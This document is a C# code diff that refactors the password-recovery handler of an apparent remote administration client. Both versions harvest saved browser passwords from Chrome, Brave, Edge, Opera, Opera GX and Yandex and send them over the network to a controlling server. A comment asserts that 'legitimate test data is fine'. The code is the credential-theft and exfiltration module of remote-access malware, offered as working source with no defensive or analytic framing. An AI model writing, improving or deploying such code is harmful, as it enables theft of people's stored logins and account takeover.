@@ -1,70 +1,53 @@
-﻿using RemoteAdmin.Shared;
-using System;
+﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
 using System.Net.Security;
 using System.Threading.Tasks;
+using RemoteAdmin.Client.Recovery;
+using RemoteAdmin.Client.Recovery.Browsers;
+using RemoteAdmin.Shared;
 
 namespace RemoteAdmin.Client.Handlers
 {
     public class PasswordRecoveryHandler
     {
+
         public static async Task HandlePasswordRecoveryRequest(SslStream stream)
         {
-            Console.WriteLine("Starting password recovery...");
-
-            var allAccounts = new List<RecoveredAccount>();
-            var browsers = new List<Recovery.Browsers.ChromiumBase>
+            // 1) Gather data (your own, legitimate test data is fine)
+            var accounts = new List<RecoveredAccount>();
+            var passReaders = new IAccountReader[]
             {
-                new Recovery.Browsers.ChromePassReader(),
-                new Recovery.Browsers.BravePassReader(),
-                new Recovery.Browsers.EdgePassReader(),
-                new Recovery.Browsers.OperaPassReader(),
-                new Recovery.Browsers.OperaGXPassReader(),
-                new Recovery.Browsers.YandexPassReader()
+                new BravePassReader(),
+                new ChromePassReader(),
+                new OperaPassReader(),
+                new OperaGXPassReader(),
+                new EdgePassReader(),
+                new YandexPassReader()
             };
-
-            foreach (var browser in browsers)
+            foreach (var reader in passReaders)
             {
                 try
                 {
-                    Console.WriteLine($"Recovering passwords from {browser.ApplicationName}...");
-                    var accounts = browser.ReadAccounts();
-
-                    if (accounts != null && accounts.Count > 0)
-                    {
-                        allAccounts.AddRange(accounts);
-                        Console.WriteLine($"Successfully recovered {accounts.Count} passwords from {browser.ApplicationName}");
-                    }
-                    else
-                    {
-                        Console.WriteLine($"No passwords found in {browser.ApplicationName}");
-                    }
+                    var r = reader.ReadAccounts();
+                    if (r != null && r.Any())
+                        accounts.AddRange(r);
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine($"Error reading accounts from {browser.ApplicationName}: {ex.Message}");
-                    // Continue with next browser even if one fails
+                    // don't crash the whole routine on one reader fail
+                    Console.WriteLine($"[{reader.GetType().Name}] error: {ex.Message}");
                 }
             }
 
-            Console.WriteLine($"Password recovery completed. Found {allAccounts.Count} accounts total.");
-
-            // Send response back to server
             var response = new PasswordRecoveryResponseMessage
             {
                 Success = true,
-                Accounts = allAccounts
+                Accounts = accounts   // ← use Accounts, not RecoveredAccounts
             };
 
-            try
-            {
-                await NetworkHelper.SendMessageAsync(stream, response);
-                Console.WriteLine("Password recovery response sent to server");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Failed to send password recovery response: {ex.Message}");
-            }
+            await NetworkHelper.SendMessageAsync(stream, response);
         }
     }
 }
